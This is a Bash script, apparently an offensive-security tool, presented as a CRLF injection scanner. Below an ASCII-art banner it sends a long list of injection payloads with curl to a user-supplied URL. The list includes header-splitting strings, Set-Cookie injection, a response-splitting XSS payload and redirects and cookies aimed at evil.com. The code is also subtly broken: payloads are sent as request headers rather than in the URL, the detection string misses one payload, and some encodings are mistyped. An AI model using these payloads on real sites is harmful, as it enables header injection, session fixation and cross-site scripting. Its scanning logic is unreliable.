#!/bin/bash



# Function to display ASCII art for tool name
display_ascii_art() {
    cat << "EOF"
  ⡴⠁⠀⢌⠉⠀⠀⠀⡀⠀⡀⠀⡀⠸⡀⠀⠀⠀⣰⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠂⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣈⣱⣤⡀⠀⠙⢦⣳⡀⢻⡄⠁⠀⠀⡼⠃⠀⠉⠚⢦⣄⡀⣆⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠃⠰⠀⠀⢰⠃⠀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀
⣀⣶⣿⣿⣗⣋⣉⣀⠀⠀⡇⢳⡀⢧⠀⢀⡾⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⣶⡶⠞⠉⠁⠀⠀⣀⠀⠀⠀⠀⢀⡆⣠⠎⢁⣤⡐⠀⠀⠀⠀⢀⣴⠀⢠⡆⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀
⣿⣿⣻⣿⣿⣻⠿⠋⠀⠀⢧⠀⠹⠄⠀⡞⠀⠀⠀⠀⢀⡖⠀⠀⢀⣤⣾⡥⣴⣖⡶⠖⣿⠞⢁⣠⡤⠾⠀⣾⣰⠋⢰⡊⠀⠀⠀⠀⠀⢀⡾⠁⣠⠏⢀⡠⠔⠀⢀⠄⠀⡠⠃⠀⠀
⢻⣽⣿⣿⣭⣥⣀⣠⠀⠀⠸⡆⠀⠀⣾⠀⠀⠀⠀⢠⡞⠀⠀⠀⠈⠹⠛⠋⠉⠀⣠⡾⠗⠚⣋⡭⠿⠶⣦⣯⣿⣀⠀⢿⡀⠀⠀⠀⣴⡟⢁⡼⠋⣴⠟⣁⣤⠞⠁⢀⡴⠁⡠⠔⠚
⠀⢻⣿⣿⡯⣴⡟⠛⣧⠀⠀⠙⠄⢰⠁⠀⠀⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⠙⢠⡶⠛⠉⠀⠀⠀⠈⠈⠙⠻⣷⣬⣷⣄⠀⠀⢻⡷⠤⣤⣤⣥⣤⣭⣥⣤⣤⣈⣀⠀⠠⠔⠚
⠀⠀⢈⣭⣶⠏⣿⣿⠘⡇⠀⠀⠀⡎⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡻⠿⣷⣆⠸⡇⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀
⣴⣾⣿⣿⡿⣼⢹⣿⠀⣷⢠⣄⣼⠁⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠘⢿⢿⣧⠀⠀⣿⠃⢀⡀⠀⠀⠀⠀⣾⡇⠀⠒⠉
⣿⣿⣿⣿⡇⠁⢸⣿⣶⡿⣼⠀⠉⢄⣀⣡⠤⠤⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⢠⠄⠀⠀⠀⠀⠘⠃⠉⠀⠀⣿⠀⠀⣿⠀⠀⠀⠀⣿⡇⢀⣠⡴
⣿⣿⣿⣿⡇⠀⣾⢻⣿⣷⡇⠀⠀⠀⠁⢀⣀⡀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⣿⠀⢸⡟⠀⠀⠀⠀⡿⢈⣫⣥⠤
⣿⣿⣿⣿⡇⠀⡏⣼⢹⣮⠃⠀⠀⠀⣤⠀⢉⠉⠑⠻⣾⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⡏⢀⣸⣧⠀⠀⠀⣼⠇⠈⠉⠀⣰
⣿⣿⣿⣿⣧⠀⣷⡏⢸⢸⠀⠀⠀⠀⢿⠕⢦⣙⠲⣄⡀⠈⢇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠆⠀⠀⢠⡾⢋⡴⠃⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⢸⡇⠀⢸⣯⠀⠀⢰⣿⣠⠶⢾⣿⡿
⢻⣿⣿⣿⣿⡄⠹⣇⣼⣾⠀⠀⠀⠀⠘⣇⠀⠛⢷⣦⣙⠲⢌⣧⡀⠀⠀⠀⠀⠀⠘⣿⣿⠀⠀⢠⡟⣡⡿⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⢀⣾⠇⠀⠀⢿⡄⢠⣾⠇⣡⠶⠛⢉⡀
⣸⣿⣿⣿⣿⣿⡀⠘⣿⡇⠀⠀⠀⠀⠀⠘⣦⡀⠘⠿⠿⠿⡦⣿⣷⣄⠀⠀⠀⠀⠀⣿⠁⠀⢠⡟⣰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣠⡿⠻⣦⡀⠀⠈⣳⣿⡟⢀⣬⣼⣿⣻⣥
⣿⣿⣿⣿⠟⠈⣧⡀⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⠶⣤⣄⣀⡈⠈⠹⣿⣦⡀⠀⢀⣤⠁⠀⢠⣿⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠞⠉⠀⠀⠈⠻⣦⡈⡹⢿⡿⣿⣿⣿⡿⣟⣙
⣿⣿⡟⠁⠀⠀⠘⣷⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⡭⢭⣿⣿⣿⣷⣶⣿⡏⠀⠀⣾⣼⠁⠀⠀⠀⠀⠀⢀⣤⡴⠞⠋⢻⡟⠳⣶⣄⡀⠀⠀⠈⠉⠀⢀⣿⣿⡿⣿⣿⣿⣽
⠛⠋⠀⠀⠀⠀⠀⢻⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⠶⣮⣋⣉⣻⣿⣇⠀⠀⠀⣿⣽⣧⣀⣤⣶⣶⣿⣯⣁⣀⣀⢀⣿⠁⠀⢀⣹⣿⡀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢸⡟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢉⡟⠀⢀⣾⠿⠿⢿⡿⢿⣾⣿⣿⣷⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠀⠀⣰⣿⣿⡿⣿⣿⣿⣷⣽⣿
⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⣾⠇⠀⠀⠀⠀⣄⠙⢿⠿⠯⢿⣿⣿⣿⡿⠿⠛⠋⠁⠀⠀⠁⢄⣾⣿⣿⢱⣿⣿⣿⣏⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢸⣿⡆⠀⠀⠀⡖⢖⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⣼⠋⠀⠀⠀⠀⠀⢸⣟⠛⠓⠀⠀⠈⡽⠛⠛⣷⡀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⡏⢻⠀⠀⠀⠀⠸⡷⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⢠⡿⠃⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⡼⢁⣤⠾⠋⠀⠀⠀⠀⠀⣾⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿
⠤⠤⠤⠤⠤⠤⠶⢿⡧⢬⣧⣄⣀⣀⣀⣳⡀⡿⢶⣄⡀⠀⠀⠀⠀⢤⣴⡇⣠⡾⠀⡀⠀⠀⠀⠀⠀⠀⠀⠹⣆⣠⡼⣿⠋⠁⠀⠀⠀⠀⠀⠆⣴⣿⡿⣻⣥⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠒⠀⠀⠀⠘⢻⣿⠋⠙⢿⣏⠉⠛⠛⠛⢿⠳⣄⡈⠛⠳⢤⣄⣀⠐⣷⣛⣭⡶⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠁⠀⣤⣄⡀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠐⢸⣿⣧⠀⠘⣿⣄⠀⠀⠀⠈⠳⣄⡙⠲⢤⣄⡈⠙⠛⠻⠯⠥⢤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⢀⣀⣠⣾⣷⣿⡇⠀⠀⠀⣾⣿⣿⡿⣿⡿⣿⡿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⣸⣿⠹⣷⡀⠸⣿⡄⠀⠀⠀⠀⠈⠙⠲⢤⣌⠉⠓⠒⠤⣤⣀⡀⠀⠉⠉⠉⠉⠉⠛⠛⣻⣿⢛⣛⣫⣽⠿⠟⠀⠀⣠⣾⣿⣿⣿⠃⣿⠑⣿⠃⣸⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⣿⣿⠀⠸⣿⣆⠹⣿⣄⠀⠀⠀⠀⠰⣄⣀⠈⠉⠓⠶⢤⣀⣀⣈⡉⠉⠉⠑⠂⠀⣈⣽⣿⣿⠿⠟⠋⠁⠀⢀⣤⣾⣿⣿⣿⣿⡏⢸⡏⢠⣿⣴⣿⣿⣿⣿⣿⣿⣿
⡅⠀⠀⠀⢨⠀⣿⣿⠀⠀⠘⢿⡀⠀⠻⡄⠀⠀⠀⠀⠙⣿⡛⢶⣤⣤⣀⣀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣀⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
⡇⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠹⣆⠀⠻⣆⠀⠀⠀⠀⠈⠛⠦⣬⣙⠛⣿⣿⠿⠿⠿⠗⠂⠀⠀⠀⠀⠀⢀⣠⣶⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻
⡇⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠈⢳⣄⠘⠳⣦⣄⡀⠀⠀⠀⠀⠉⠉⠉⠉⣹⠆⠀⠀⠀⠀⢀⣠⣴⣶⠟⠋⠀⣠⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⠏
⡇⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⢸⡏⠛⠻⢶⣶⣤⣤⣤⣴⣚⣁⣀⣤⣴⣶⣿⡿⠋⠉⠁⢀⣤⣾⣫⣽⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⡾⠀
⣇⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣧⠀⠀⠀⠀⠘⠿⠍⣉⠉⠉⠉⢉⣴⡿⠋⠀⣀⣴⣾⣿⡷⠟⠋⠁⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣸⠁⠀
⡇⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⠀⠀⣨⣀⣤⣾⣟⣡⣤⡾⠿⠟⠛⠉⢡⣄⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢰⡇⠀⠀
⠷⠦⠴⠤⠤⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⢀⣤⡾⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠟⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢀⡿⠀⠀⠀        

               ____  _______  __
              |  _ \| ____\ \/ /
              | |_) |  _|  \  / 
              |  _ <| |___ /  \ 
              |_| \_\_____/_/\_\                            ⠀⠀

+-------------------------------------------------------+
|                                                       |
|        REX - CRLF injection vulnerability scanner    |        
|        Author: Ajansha Shankar                        |    
|        LinkedIn: Ajansha Shankar                      |      
|        GitHub: https://github.com/ajansha             |   
+-------------------------------------------------------+

EOF
}


main() {
    echo "Running tool..."
}

# Display ASCII art
display_ascii_art


main


#payloads
Crlf_vulnerabilities_scan() {
    url=$1
    payloads=(
        "%0D%0AHeader-Test:AJAN"
        "%0AHeader-Test:BLATRUC"
        "%0A%20Header-Test:BLATRUC"
        "%20%0AHeader-Test:BLATRUC"
        "%23%OAHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC"
        "%3F%0AHeader-Test:BLATRUC"
        "crlf%0AHeader-Test:BLATRUC"
        "crlf%0A%20Header-Test:BLATRUC"
        "crlf%20%0AHeader-Test:BLATRUC"
        "crlf%23%OAHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC"
        "crlf%3F%0AHeader-Test:BLATRUC"
        "%0DHeader-Test:BLATRUC"
        "%0D%20Header-Test:BLATRUC"
        "%20%0DHeader-Test:BLATRUC"
        "%23%0DHeader-Test:BLATRUC"
        "%23%0AHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC"
        "%3F%0DHeader-Test:BLATRUC"
        "crlf%0DHeader-Test:BLATRUC"
        "crlf%0D%20Header-Test:BLATRUC"
        "crlf%20%0DHeader-Test:BLATRUC"
        "crlf%23%0DHeader-Test:BLATRUC"
        "crlf%23%0AHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC"
        "crlf%3F%0DHeader-Test:BLATRUC"
        "%0D%0AHeader-Test:BLATRUC"
        "%0D%0A%20Header-Test:BLATRUC"
        "%20%0D%0AHeader-Test:BLATRUC"
        "%23%0D%0AHeader-Test:BLATRUC"
        "\r\nHeader-Test:BLATRUC"
        " \r\n Header-Test:BLATRUC"
        "\r\n Header-Test:BLATRUC"
        "%5cr%5cnHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC"
        "%3F%0D%0AHeader-Test:BLATRUC"
        "crlf%0D%0AHeader-Test:BLATRUC"
        "crlf%0D%0A%20Header-Test:BLATRUC"
        "crlf%20%0D%0AHeader-Test:BLATRUC"
        "crlf%23%0D%0AHeader-Test:BLATRUC"
        "crlf\r\nHeader-Test:BLATRUC"
        "crlf%5cr%5cnHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC"
        "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC"
        "crlf%3F%0D%0AHeader-Test:BLATRUC"
        "%0D%0A%09Header-Test:BLATRUC"
        "crlf%0D%0A%09Header-Test:BLATRUC"
        "%250AHeader-Test:BLATRUC"
        "%25250AHeader-Test:BLATRUC"
        "%%0A0AHeader-Test:BLATRUC"
        "%25%30AHeader-Test:BLATRUC"
        "%25%30%61Header-Test:BLATRUC"
        "%u000AHeader-Test:BLATRUC"
        "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC"
        "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC"
        "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
        "/%%0a0aSet-Cookie:crlf:crlf=injection"
	"/%%0aSet-Cookie:crlf:crlf=injection"
	"/%0d0aSet-Cookie:crlf:crlf=injection"
	"/%0dSet-Cookie:crlf:crlf=injection"
	"/%23%0aSet-Cookie:crlf:crlf=injection"
	"/%23%0dSet-Cookie:crlf:crlf=injection"
	"/%25%30%61Set-Cookie:crlf:crlf=injection"
	"/%25%30aSet-Cookie:crlf:crlf=injection"
	"/%250aSet-Cookie:crlf:crlf=injection"
 	"/%25250aSet-Cookie:crlf=injection"
	"/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection"
	"/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection"
	"/%2F..%0d%0aSet-Cookie:crlf=injection"
	"/%3f%0d%0aSet-Cookie:crlf=injection"
	"/%3f%0dSet-Cookie:crlf=injection"
	"/%u000aSet-Cookie:crlf=injection"
	"%0d"
	"%0a"
	"%0d%0a"
	"%250d%250a"
	"\r"
	"\n"
	"\r\n"
	"%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E"
	"%0d%0aLocation:%20https://evil.com"	
	"%0D%0ASet-Cookie:test2=test;domain=evil.com"
	"%E5%98%8A%E5%98%8DSet-Cookie:%20test"
	"%E5%98%8D"
	"%E5%98%8A"
	"%E5%98%8D%E5%98%8AContent-Type:text/html%0d%0a"
	"%0d%0aLocation:%20http://example.com"
	"/%0d%0aLocation:%20http://example.com"


    )


    for payload in "${payloads[@]}"; do
        response=$(curl -s -I -X GET "$url" -H "$payload")
        if [[ $response == *"Header-Test: BLATRUC"* ]]; then
            echo "Vulnerable to CRLF injection with payload: $payload"
            return
        fi
    done

    echo "Not vulnerable to CRLF injection"
}

main() {
    read -p "Enter URL to scan for various CRLF injection vulnerabilities: " url

    if [ -z "$url" ]; then
        echo "URL is required"
        exit 1
    fi
  Crlf_vulnerabilities_scan  "$url"
}

main
